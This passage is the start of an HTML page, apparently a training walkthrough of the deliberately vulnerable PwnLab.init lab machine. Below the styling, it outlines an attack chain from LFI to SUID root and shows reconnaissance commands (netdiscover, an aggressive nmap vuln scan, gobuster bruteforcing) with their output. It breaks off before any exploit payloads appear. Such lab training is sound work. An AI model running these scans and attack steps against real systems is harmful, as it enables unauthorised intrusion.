@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PwnLab.init — Full Machine Walkthrough</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap');
+
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--bg: #0a0a0f;--bg2: #0f0f18;--bg3: #14141f;--card: #1a1a2e;--card2: #1e1e32;--border: rgba(0,255,136,0.12);--border2: rgba(0,255,136,0.3);--green: #00ff88;--green-dim: #00cc6a;--green-dark: #009944;--green-glow: rgba(0,255,136,0.08);--text: #e0e0e8;--text2: #9090a0;--text3: #606070;--red: #ff3355;--orange: #ff8800;--yellow: #ffcc00;--blue: #3399ff;--purple: #8833ff}
+html{scroll-behavior:smooth;font-size:16px}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.7;overflow-x:hidden}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg2)}
+::-webkit-scrollbar-thumb{background:var(--green-dark);border-radius:3px}
+::selection{background:var(--green);color:var(--bg)}
+a{color:var(--green);text-decoration:none;transition:.3s}
+a:hover{color:var(--green-dim);text-shadow:0 0 20px var(--green-glow)}
+
+/* Utility */
+.container{max-width:1200px;margin:0 auto;padding:0 24px}
+.glass{background:var(--card);border:1px solid var(--border);backdrop-filter:blur(12px);border-radius:16px}
+
+/* Typography */
+h1,h2,h3,h4{font-family:'Orbitron',sans-serif;font-weight:700;line-height:1.2}
+h2{font-size:2rem;margin-bottom:1.5rem;background:linear-gradient(135deg,var(--green),var(--green-dim));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;display:inline-block}
+h3{font-size:1.25rem;margin-bottom:1rem;color:var(--green)}
+code,.terminal-text{font-family:'JetBrains Mono',monospace;font-size:.875rem}
+.terminal-text{color:var(--green)}
+.label{font-family:'JetBrains Mono',monospace;font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--green-dim);font-weight:500}
+
+/* Buttons */
+.btn{display:inline-flex;align-items:center;gap:10px;padding:14px 32px;border-radius:10px;font-family:'Inter',sans-serif;font-weight:600;font-size:.9rem;border:1px solid var(--green);background:transparent;color:var(--green);cursor:pointer;transition:.3s;text-transform:none;letter-spacing:.02em}
+.btn:hover{background:var(--green);color:var(--bg);box-shadow:0 0 40px var(--green-glow);transform:translateY(-2px)}
+.btn-primary{background:var(--green);color:var(--bg)}
+.btn-primary:hover{background:var(--green-dim);box-shadow:0 0 60px rgba(0,255,136,0.2)}
+.btn-group{display:flex;gap:16px;flex-wrap:wrap}
+
+/* Section */
+.section{padding:100px 0;position:relative}
+.section-dark{background:var(--bg2)}
+.section-title{text-align:center;margin-bottom:4rem}
+.section-title h2{font-size:2.5rem}
+.section-title p{color:var(--text2);font-size:1.1rem;max-width:700px;margin:16px auto 0}
+
+/* Cards */
+.card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.card{padding:28px;border-radius:16px;border:1px solid var(--border);background:var(--card);transition:.3s}
+.card:hover{border-color:var(--border2);transform:translateY(-4px);box-shadow:0 8px 40px rgba(0,255,136,0.06)}
+.card-icon{font-size:1.5rem;margin-bottom:12px;color:var(--green)}
+.card h4{margin-bottom:8px;font-family:'Inter',sans-serif;font-weight:600;color:var(--text)}
+.card p{font-size:.9rem;color:var(--text2);line-height:1.6}
+.severity{display:inline-block;padding:3px 12px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:.05em;margin-top:8px}
+.severity-high{background:rgba(255,51,85,0.15);color:var(--red);border:1px solid rgba(255,51,85,0.3)}
+.severity-critical{background:rgba(255,51,85,0.2);color:var(--red);border:1px solid rgba(255,51,85,0.4)}
+.severity-medium{background:rgba(255,136,0,0.15);color:var(--orange);border:1px solid rgba(255,136,0,0.3)}
+.severity-low{background:rgba(153,153,255,0.1);color:var(--text2);border:1px solid rgba(153,153,255,0.15)}
+
+/* Terminal */
+.terminal{background:#0a0a0f;border:1px solid var(--border);border-radius:12px;overflow:hidden;margin:24px 0;font-family:'JetBrains Mono',monospace}
+.terminal-bar{display:flex;align-items:center;padding:10px 16px;background:var(--bg3);border-bottom:1px solid var(--border);gap:8px}
+.terminal-dot{width:10px;height:10px;border-radius:50%}
+.terminal-dot.red{background:#ff5f5f}
+.terminal-dot.yellow{background:#ffbd2e}
+.terminal-dot.green{background:#28c840}
+.terminal-title{font-size:.75rem;color:var(--text3);margin-left:12px;font-family:'JetBrains Mono',monospace}
+.terminal-body{padding:20px;overflow-x:auto;font-size:.85rem;line-height:1.7;color:var(--green)}
+.terminal-body .prompt{color:var(--green)}
+.terminal-body .cmd{color:var(--text)}
+.terminal-body .output{color:var(--text2)}
+.terminal-body .highlight{color:var(--yellow)}
+.terminal-body .error{color:var(--red)}
+.terminal-body .success{color:var(--green)}
+.terminal-body .comment{color:var(--text3);font-style:italic}
+
+/* Attack Chain */
+.chain{display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:6px;padding:40px 0}
+.chain-item{display:flex;align-items:center;gap:8px}
+.chain-node{padding:12px 24px;border-radius:10px;border:1px solid var(--border);background:var(--card);font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);cursor:pointer;transition:.3s;text-align:center;min-width:100px}
+.chain-node:hover{border-color:var(--green);color:var(--green);box-shadow:0 0 30px var(--green-glow);transform:translateY(-2px)}
+.chain-node.active{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.06)}
+.chain-arrow{color:var(--green-dark);font-size:1.2rem}
+
+/* Key Insight */
+.insight{padding:24px;border-radius:12px;border:1px solid rgba(0,255,136,0.15);background:rgba(0,255,136,0.04);margin:20px 0}
+.insight-label{font-family:'JetBrains Mono',monospace;font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--green-dim);margin-bottom:6px}
+.insight h4{font-family:'Inter',sans-serif;font-size:1.05rem;color:var(--text);margin-bottom:6px}
+.insight p{color:var(--text2);font-size:.9rem}
+
+/* Impact Table */
+.impact-table{width:100%;border-collapse:collapse;margin:20px 0;font-family:'Inter',sans-serif;font-size:.85rem}
+.impact-table th{padding:12px 16px;text-align:left;border-bottom:2px solid var(--border);color:var(--green-dim);font-family:'JetBrains Mono',monospace;font-size:.7rem;text-transform:uppercase;letter-spacing:.08em}
+.impact-table td{padding:12px 16px;border-bottom:1px solid var(--border);color:var(--text2)}
+.impact-table tr:hover td{background:rgba(0,255,136,0.02)}
+.impact-table .high{color:var(--red);font-weight:600}
+.impact-table .critical{color:var(--red);font-weight:600}
+.impact-table .medium{color:var(--orange)}
+
+/* Hero */
+.hero{min-height:100vh;display:flex;align-items:center;position:relative;overflow:hidden;padding:120px 0 80px}
+.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(0,255,136,0.04) 0%,transparent 60%)}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,136,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,0.03) 1px,transparent 1px);background-size:60px 60px;pointer-events:none}
+.hero-content{position:relative;z-index:2;max-width:800px}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 20px;border-radius:100px;border:1px solid var(--border);font-size:.75rem;font-family:'JetBrains Mono',monospace;color:var(--green-dim);margin-bottom:24px;background:rgba(0,255,136,0.04)}
+.hero h1{font-size:4.5rem;line-height:1;margin-bottom:8px;background:linear-gradient(135deg,#fff 20%,var(--green) 80%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero .domain{font-size:1.2rem;font-family:'JetBrains Mono',monospace;color:var(--green-dim);margin-bottom:16px}
+.hero p{font-size:1.15rem;color:var(--text2);max-width:650px;line-height:1.8;margin-bottom:36px}
+
+/* Hero Terminal */
+.hero-terminal{position:absolute;right:0;top:50%;transform:translateY(-50%);width:420px;max-height:500px;overflow:hidden;border-radius:16px;border:1px solid var(--border);background:rgba(10,10,15,0.85);backdrop-filter:blur(20px)}
+@media(max-width:1100px){.hero-terminal{display:none}}
+.hero-terminal .terminal-body{padding:16px;font-size:.75rem;line-height:1.5;height:400px;overflow-y:hidden}
+.hero-terminal .log-line{opacity:0;animation:logFadeIn 0.5s ease forwards}
+@keyframes logFadeIn{to{opacity:1}}
+.hero-terminal .log-time{color:var(--text3);margin-right:8px}
+.hero-terminal .log-status{color:var(--green)}
+.hero-terminal .log-status.done{color:var(--green)}
+.hero-terminal .log-status.progress{color:var(--yellow)}
+.hero-terminal .log-status.fail{color:var(--red)}
+
+/* Visualizer */
+.visualizer{padding:40px 0;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+@media(max-width:768px){.visualizer{grid-template-columns:1fr}}
+
+/* Steps */
+.steps{counter-reset:step;margin:24px 0}
+.step{padding:20px 24px 20px 60px;position:relative;border-left:2px solid var(--border);margin-left:16px;transition:.3s}
+.step:hover{border-left-color:var(--green)}
+.step::before{counter-increment:step;content:counter(step);position:absolute;left:-16px;top:20px;width:30px;height:30px;border-radius:50%;background:var(--card);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--green);font-weight:700;transition:.3s}
+.step:hover::before{border-color:var(--green);box-shadow:0 0 20px var(--green-glow)}
+.step:last-child{border-left-color:transparent}
+.step h4{margin-bottom:6px}
+.step p{color:var(--text2);font-size:.9rem}
+
+/* Cookie Box */
+.cookie-box{padding:20px;border-radius:10px;background:var(--bg3);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.8rem;margin:16px 0}
+.cookie-box .key{color:var(--green)}
+.cookie-box .value{color:var(--yellow)}
+.cookie-box .string{color:var(--text2)}
+
+/* Network Animation */
+.network-anim{position:relative;height:300px;border-radius:16px;border:1px solid var(--border);background:var(--bg3);overflow:hidden;margin:20px 0}
+.network-node{position:absolute;width:14px;height:14px;border-radius:50%;background:var(--green);box-shadow:0 0 20px var(--green-glow);transition:.3s}
+.network-node.attacker{background:var(--red);left:10%;top:50%;box-shadow:0 0 30px rgba(255,51,85,0.3)}
+.network-node.target{background:var(--green);right:10%;top:50%}
+.network-pulse{position:absolute;width:14px;height:14px;border-radius:50%;background:transparent;border:2px solid var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%{transform:scale(1);opacity:1}100%{transform:scale(3);opacity:0}}
+.network-packet{position:absolute;width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);animation:fly 3s linear infinite;opacity:0}
+@keyframes fly{0%{left:15%;top:50%;opacity:1}30%{left:40%;top:30%;opacity:1}60%{left:60%;top:60%;opacity:1}100%{left:88%;top:48%;opacity:0}}
+.network-line{position:absolute;left:15%;top:50%;width:70%;height:2px;background:linear-gradient(90deg,var(--red),var(--green-dark),var(--green));opacity:.3}
+
+/* Base64 Visualizer */
+.b64-visualizer{padding:24px;border-radius:12px;background:var(--bg3);border:1px solid var(--border);margin:16px 0;font-family:'JetBrains Mono',monospace}
+.b64-row{display:flex;align-items:center;gap:12px;padding:8px 0;font-size:.8rem;flex-wrap:wrap}
+.b64-row .label{min-width:100px;font-size:.7rem}
+.b64-arrow{color:var(--green-dim);font-size:1rem;margin:4px 0}
+
+/* SUID Box */
+.suid-box{padding:20px;border-radius:10px;background:rgba(255,51,85,0.06);border:1px solid rgba(255,51,85,0.2);font-family:'JetBrains Mono',monospace;font-size:.8rem;margin:16px 0}
+.suid-highlight{color:var(--yellow);font-weight:700}
+
+/* Practice Labs */
+.lab-card{padding:28px;border-radius:16px;border:1px solid var(--border);background:var(--card);margin:16px 0}
+.lab-card h4{margin-bottom:8px;font-family:'Inter',sans-serif;font-weight:600}
+.lab-card p{font-size:.85rem;color:var(--text2);margin-bottom:16px}
+.lab-input{width:100%;padding:12px 16px;border-radius:8px;border:1px solid var(--border);background:var(--bg3);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.8rem;outline:none;transition:.3s;margin-bottom:12px}
+.lab-input:focus{border-color:var(--green);box-shadow:0 0 20px var(--green-glow)}
+.lab-output{padding:12px 16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--text2);min-height:40px}
+
+/* Defense Grid */
+.defense-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px;margin:24px 0}
+.defense-card{padding:20px;border-radius:12px;border:1px solid var(--border);background:var(--card)}
+.defense-card .def-title{font-family:'JetBrains Mono',monospace;font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--green-dim);margin-bottom:4px}
+.defense-card h4{font-size:1rem;margin-bottom:6px;font-family:'Inter',sans-serif}
+.defense-card p{font-size:.8rem;color:var(--text2)}
+
+/* Mindset */
+.mindset-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;margin:24px 0}
+.mindset-card{padding:24px;border-radius:12px;border:1px solid var(--border);background:var(--card);text-align:center}
+.mindset-card .num{font-family:'Orbitron',sans-serif;font-size:2.5rem;color:var(--green);opacity:.5;margin-bottom:4px}
+.mindset-card h4{font-size:.95rem;margin-bottom:4px}
+.mindset-card p{font-size:.8rem;color:var(--text2)}
+
+/* Highlight Box */
+.highlight-box{padding:24px;border-radius:12px;border-left:4px solid var(--green);background:rgba(0,255,136,0.04);margin:24px 0}
+.highlight-box.warn{border-left-color:var(--orange);background:rgba(255,136,0,0.04)}
+.highlight-box.danger{border-left-color:var(--red);background:rgba(255,51,85,0.04)}
+.highlight-box h4{margin-bottom:6px;font-family:'Inter',sans-serif}
+.highlight-box p{color:var(--text2);font-size:.9rem}
+
+/* Clickable Section Jump */
+.section-jump{scroll-margin-top:80px}
+
+/* Responsive */
+@media(max-width:768px){
+  .hero h1{font-size:2.5rem}
+  .hero p{font-size:1rem}
+  .chain{flex-direction:column}
+  .chain-arrow{transform:rotate(90deg)}
+  .chain-item{flex-direction:column}
+  .section-title h2{font-size:1.8rem}
+  .btn{width:100%;justify-content:center}
+}
+
+/* Footer */
+.footer{padding:60px 0;border-top:1px solid var(--border);text-align:center;color:var(--text3);font-size:.8rem}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav style="position:fixed;top:0;left:0;right:0;z-index:100;padding:16px 24px;background:rgba(10,10,15,0.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between">
+  <a href="#" style="font-family:'Orbitron',sans-serif;font-weight:700;color:var(--green);font-size:1.1rem">PwnLab.init</a>
+  <div style="display:flex;gap:20px;font-size:.8rem">
+    <a href="#overview" style="color:var(--text2)">Overview</a>
+    <a href="#chain" style="color:var(--text2)">Chain</a>
+    <a href="#walkthrough" style="color:var(--text2)">Walkthrough</a>
+    <a href="#defense" style="color:var(--text2)">Defense</a>
+    <a href="#labs" style="color:var(--text2)">Labs</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-grid"></div>
+  <div class="container">
+    <div class="hero-content">
+      <div class="hero-badge">Offensive Security Training Lab</div>
+      <h1>PwnLab.init</h1>
+      <div class="domain">From Web Exploitation → Full Root Compromise</div>
+      <p>Understanding how chained web vulnerabilities, weak configurations, and Linux privilege escalation techniques lead to full system compromise in real-world environments.</p>
+      <div class="btn-group">
+        <a href="#walkthrough" class="btn btn-primary">Start Walkthrough</a>
+        <a href="#labs" class="btn">Launch Simulations</a>
+      </div>
+    </div>
+    <div class="hero-terminal" id="heroTerminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">attack-surface.log</span>
+      </div>
+      <div class="terminal-body" id="heroLogs"></div>
+    </div>
+  </div>
+</section>
+
+<!-- OVERVIEW -->
+<section class="section" id="overview">
+  <div class="container">
+    <div class="section-title">
+      <div class="label" style="margin-bottom:8px">Machine Overview</div>
+      <h2>PwnLab.init</h2>
+      <p>A purposely vulnerable Linux machine designed to teach real-world web exploitation, privilege escalation methodology, and attack chaining.</p>
+    </div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:40px">
+      <div class="card" style="text-align:center">
+        <div style="font-family:'Orbitron',sans-serif;font-size:2rem;color:var(--green);margin-bottom:4px">7+</div>
+        <p style="font-size:.8rem;color:var(--text2)">Exploitation Techniques</p>
+      </div>
+      <div class="card" style="text-align:center">
+        <div style="font-family:'Orbitron',sans-serif;font-size:2rem;color:var(--green);margin-bottom:4px">4</div>
+        <p style="font-size:.8rem;color:var(--text2)">Privilege Escalation Steps</p>
+      </div>
+      <div class="card" style="text-align:center">
+        <div style="font-family:'Orbitron',sans-serif;font-size:2rem;color:var(--green);margin-bottom:4px">Full</div>
+        <p style="font-size:.8rem;color:var(--text2)">System Compromise</p>
+      </div>
+      <div class="card" style="text-align:center">
+        <div style="font-family:'Orbitron',sans-serif;font-size:2rem;color:var(--green);margin-bottom:4px">Root</div>
+        <p style="font-size:.8rem;color:var(--text2)">Flag Retrieved</p>
+      </div>
+    </div>
+    <div class="card-grid">
+      <div class="card"><div class="card-icon">01</div><h4>Local File Inclusion</h4><p>Abusing include() to read arbitrary files from the server filesystem.</p><span class="severity severity-high">High</span></div>
+      <div class="card"><div class="card-icon">02</div><h4>PHP Filter Abuse</h4><p>Using php://filter streams to bypass execution and extract source code.</p><span class="severity severity-high">High</span></div>
+      <div class="card"><div class="card-icon">03</div><h4>Credential Harvesting</h4><p>Extracting Base64-encoded credentials from compromised database dumps.</p><span class="severity severity-critical">Critical</span></div>
+      <div class="card"><div class="card-icon">04</div><h4>File Upload Bypass</h4><p>Circumventing extension validation to deploy a PHP web shell.</p><span class="severity severity-critical">Critical</span></div>
+      <div class="card"><div class="card-icon">05</div><h4>Reverse Shell</h4><p>Establishing interactive remote access to the target system.</p><span class="severity severity-high">High</span></div>
+      <div class="card"><div class="card-icon">06</div><h4>PATH Hijacking</h4><p>Exploiting relative command calls to execute malicious binaries.</p><span class="severity severity-high">High</span></div>
+      <div class="card"><div class="card-icon">07</div><h4>SUID Exploitation</h4><p>Abusing setuid binaries with unsafe system() calls for root escalation.</p><span class="severity severity-critical">Critical</span></div>
+    </div>
+    <div style="margin-top:40px;padding:28px;border-radius:16px;border:1px solid var(--border);background:var(--card)">
+      <h3>Skills Students Will Learn</h3>
+      <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:12px">
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Network Reconnaissance</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Port Scanning</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Web Enumeration</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">LFI Exploitation</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">PHP Filter Abuse</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Database Enumeration</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Upload Bypass</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Reverse Shell</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Shell Stabilization</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Privilege Escalation</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">PATH Hijacking</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">SUID Exploitation</span>
+        <span style="padding:6px 16px;border-radius:20px;border:1px solid var(--border);font-size:.8rem;color:var(--text2)">Attack Chaining</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ATTACK CHAIN OVERVIEW -->
+<section class="section section-dark" id="chain">
+  <div class="container">
+    <div class="section-title">
+      <div class="label" style="margin-bottom:8px">Full Kill Chain</div>
+      <h2>Attack Chain Overview</h2>
+      <p>Every attack phase visualized. Click any phase to jump to its detailed explanation.</p>
+    </div>
+    <div class="chain" id="attackChain">
+      <div class="chain-item"><a href="#recon" class="chain-node">Recon</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#enum" class="chain-node">Enumeration</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#lfi-section" class="chain-node">LFI</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#cred-section" class="chain-node">Credentials</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#upload-section" class="chain-node">Upload</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#rce-section" class="chain-node">RCE</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#shell-section" class="chain-node">Shell</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#pivot-section" class="chain-node">Pivot</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#privesc-section" class="chain-node">PrivEsc</a><span class="chain-arrow">▸</span></div>
+      <div class="chain-item"><a href="#root-section" class="chain-node">Root</a></div>
+    </div>
+  </div>
+</section>
+
+<!-- WALKTHROUGH -->
+<section class="section" id="walkthrough">
+<div class="container">
+
+<!-- SECTION 4: RECON -->
+<section class="section-jump" id="recon">
+<h2 style="margin-top:0">Phase 1: Network Discovery</h2>
+<p style="color:var(--text2);margin-bottom:24px">Before any attack, an attacker must discover what systems exist on the network. In real corporate environments, the target IP is rarely given — attackers use ARP-based discovery to map the live landscape.</p>
+
+<div class="visualizer">
+<div>
+<div class="insight">
+<div class="insight-label">Why This Matters</div>
+<h4>Reconnaissance is the foundation of every attack</h4>
+<p>Internal attackers use ARP requests to identify live hosts. This is passive, low-risk, and reveals the entire attack surface. In the real world, knowing which systems are alive determines the entire engagement strategy.</p>
+</div>
+<div class="impact-table" style="margin-top:16px">
+<table style="width:100%">
+<tr><th>Factor</th><th>Level</th></tr>
+<tr><td>Recon Risk</td><td><span class="medium">Low</span></td></tr>
+<tr><td>Damage Potential</td><td>None</td></tr>
+<tr><td>Information Exposure</td><td>IP addressing, live hosts</td></tr>
+</table>
+</div>
+</div>
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">netdiscover</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">netdiscover -r 192.168.1.0/24</span><br/>
+<span class="comment"># ARP-based host discovery scanning local subnet</span><br/><br/>
+<span class="output">Currently scanning: 192.168.1.0/24 | Screen View: Unique Hosts</span><br/><br/>
+<span class="output">192.168.1.1     00:50:56:c0:00:01     VMware, Inc.</span><br/>
+<span class="highlight">192.168.1.8     00:0c:29:3a:1b:4e     VMware, Inc.</span><span class="success">  ← TARGET</span><br/>
+<span class="output">192.168.1.100   00:50:56:e7:2a:8f     VMware, Inc.</span><br/><br/>
+<span class="success">✔ Target identified: 192.168.1.8</span>
+</div>
+</div>
+</div>
+
+<div class="highlight-box">
+<h4>Corporate LAN Analogy</h4>
+<p>Imagine walking into a corporate office. Before you pick a door to open, you need to know which doors exist. netdiscover is the attacker's way of saying "which machines are powered on?" — it sends ARP requests and listens for replies, mapping the live network in seconds.</p>
+</div>
+</section>
+
+<!-- SECTION 5: PORT SCANNING -->
+<section class="section-jump" id="enum" style="margin-top:80px">
+<h2>Phase 2: Port Scanning &amp; Enumeration</h2>
+<p style="color:var(--text2);margin-bottom:24px">Once a target is found, attackers probe for open doors. Every open port is a potential entry point. Web services on port 80/443 are the most common initial footholds.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">nmap scan</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">nmap -p- -A -T5 -sV -O --script=vuln 192.168.1.8</span><br/><br/>
+<span class="output">Starting Nmap scan...</span><br/>
+<span class="output">PORT   STATE SERVICE VERSION</span><br/>
+<span class="highlight">80/tcp open  http    Apache httpd 2.4.29</span><br/>
+<span class="output">3306/tcp open  mysql   MySQL 5.7.23-0ubuntu0.18.04.1</span><br/><br/>
+<span class="success">✔ Web server detected: Apache 2.4.29</span><br/>
+<span class="success">✔ MySQL database exposed: 5.7.23</span>
+</div>
+</div>
+
+<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin:20px 0">
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div class="label" style="margin-bottom:4px">-p-</div>
+<span style="font-size:.8rem;color:var(--text2)">All 65535 ports</span>
+</div>
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div class="label" style="margin-bottom:4px">-A</div>
+<span style="font-size:.8rem;color:var(--text2)">Aggressive OS + service detection</span>
+</div>
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div class="label" style="margin-bottom:4px">-sV</div>
+<span style="font-size:.8rem;color:var(--text2)">Service version fingerprinting</span>
+</div>
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div class="label" style="margin-bottom:4px">-O</div>
+<span style="font-size:.8rem;color:var(--text2)">OS detection</span>
+</div>
+<div style="padding:16px;border-radius:8px;background:var(--bg3);border:1px solid var(--border);text-align:center">
+<div class="label" style="margin-bottom:4px">--script=vuln</div>
+<span style="font-size:.8rem;color:var(--text2)">Known vulnerability checks</span>
+</div>
+</div>
+
+<div class="insight">
+<div class="insight-label">Attacker Reasoning</div>
+<h4>Why port 80 matters most</h4>
+<p>Port 80 (HTTP) reveals a web application. Web apps are high-value targets because they accept user input, connect to databases, and often contain business logic flaws. MySQL on 3306 confirms a backend database — credentials found later will unlock it.</p>
+</div>
+
+<div class="highlight-box">
+<h4>Real-World Context</h4>
+<p>In a typical penetration test, finding Apache 2.4.29 + MySQL 5.7.23 immediately suggests a PHP-based LAMP stack. Attackers note the versions for vulnerability research and build their exploit strategy around PHP misconfigurations.</p>
+</div>
+</section>
+
+<!-- SECTION 6: WEB RECON -->
+<section class="section-jump" style="margin-top:80px">
+<h2>Phase 3: Web Application Reconnaissance</h2>
+<p style="color:var(--text2);margin-bottom:24px">When attackers see a login page, they never trust what is visible. Hidden directories, files, and parameters contain the real vulnerabilities. The attacker's mindset starts here.</p>
+
+<div class="visualizer">
+<div>
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">browser — http://192.168.1.8</span></div>
+<div class="terminal-body">
+<span class="comment"># Login page detected</span><br/>
+<span class="comment"># PHP-based application</span><br/>
+<span class="comment"># Dynamic parameter suspected</span><br/><br/>
+<span class="highlight">LOGIN FORM</span><br/>
+<span class="output">[Username: ________]</span><br/>
+<span class="output">[Password: ________]</span><br/>
+<span class="output">[Login Button]</span>
+</div>
+</div>
+</div>
+<div>
+<div class="insight" style="margin-top:0">
+<div class="insight-label">Attacker Thought Process</div>
+<h4>What an attacker asks when seeing a login page</h4>
+<ul style="color:var(--text2);font-size:.9rem;list-style:none;padding:0;margin-top:12px">
+<li style="padding:6px 0">Where are credentials stored?</li>
+<li style="padding:6px 0">Are parameters dynamically included?</li>
+<li style="padding:6px 0">Are file uploads possible?</li>
+<li style="padding:6px 0">Is user input properly sanitized?</li>
+<li style="padding:6px 0">What happens after authentication?</li>
+</ul>
+</div>
+</div>
+</div>
+</section>
+
+<!-- SECTION 7: DIRECTORY BRUTEFORCING -->
+<section class="section-jump" style="margin-top:80px">
+<h2>Phase 4: Directory Bruteforcing</h2>
+<p style="color:var(--text2);margin-bottom:24px">Developers leave admin pages, includes, config files, and test endpoints exposed. Web servers do not hide files automatically. Attackers enumerate hidden paths to discover the full attack surface.</p>
+
+<div class="terminal">
+<div class="terminal-bar"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">gobuster</span></div>
+<div class="terminal-body">
+<span class="prompt"># </span><span class="cmd">gobuster dir -u http://192.168.1.8 -w /usr/share/wordlists/dirb/common.txt -x php,txt</span><br/><br/>
+<span class="output">/index.php            (Status: 200)</span><br/>
+<span class="output">/login.php            (Status: 200)</span><br/>
+<span class="highlight">/config.php            (Status: 200)</span><span class="success">  ★ HIGH VALUE</span><br/>
+<span class="output">/upload.php           (Status: 200)</span><span class="success">  ★ HIGH VALUE</span><br/>
+<span class="highlight">/include/             (Status: 301)</span><span class="success">  ★ CRITICAL</span><br/>
+<br/>
+<span class="comment"># Key discoveries:</span><br/>
+<span class="success">✔ config.php   → likely database credentials</span><br/>
+<span class="success">✔ upload.php   → file upload functionality</span><br/>
+<span class="success">✔ include/     → dynamic file inclusion path</span>
+</div>
+</div>
+
+<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin:20px 0">
